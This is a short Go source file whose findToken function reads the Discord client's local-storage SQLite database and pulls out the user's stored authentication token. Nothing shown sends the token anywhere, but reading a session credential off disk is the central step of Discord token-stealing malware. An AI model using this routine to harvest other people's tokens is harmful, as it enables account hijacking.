package main;

import (
	"os"
	"os/user"
	"path/filepath"
	"database/sql"
	_ "github.com/mattn/go-sqlite3"
	"strings"
)

const STORAGEFILENAME = "https_discordapp.com_0.localstorage";
const TOKENQUERY = "SELECT value FROM ItemTable WHERE key='token'";

func findToken() (string, error){
	var path string;
	if(WINDOWS){
		path = os.Getenv("APPDATA") + "/Discord";
	} else {
		current, err := user.Current();
		if(err != nil){
			return "", err;
		}
		path = filepath.Join(current.HomeDir, ".config/discord");
	}

	path = filepath.Join(path, "Local Storage", STORAGEFILENAME);
	db, err := sql.Open("sqlite3", path);
	if(err != nil){
		return "", err;
	}
	defer db.Close();

	var token string;
	err = db.QueryRow(TOKENQUERY).Scan(&token);
	if(err != nil){
		return "", err;
	}

	return strings.Replace(token, "\x00", "", -1), nil;
}
